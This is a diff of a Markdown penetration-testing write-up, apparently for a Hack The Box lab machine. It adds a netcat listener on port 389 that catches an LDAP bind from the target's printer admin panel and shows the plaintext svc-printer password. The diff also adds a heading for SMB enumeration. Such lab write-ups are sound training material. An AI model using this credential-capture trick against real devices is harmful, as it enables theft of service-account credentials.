@@ -136,7 +136,7 @@ There is a interesting `functionality`. To test it, we replace the `"Server Addr
 
 <br />
 
-
+![4](../../../assets/images/Return/4.png)
 
 <br />
 
@@ -145,7 +145,17 @@ And when we check the `listener`, there something that seems to be a `password`:
 <br />
 
 ```bash
-
+❯ nc -nlvp 389
+listening on [any] 389 ...
+connect to [10.10.14.28] from (UNKNOWN) [10.10.11.108] 54344
+0*`%return\svc-printer�
+                       1edFg43012!!
 ```
 
 <br />
+
+# SMB Enumeration: -> Port 445
+
+<br />
+
+
